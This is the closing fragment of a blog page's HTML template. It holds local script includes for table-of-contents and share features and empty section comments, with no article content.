<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

        <!-- share -->
        
            
<script src="/js/post/share.js"></script>

        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
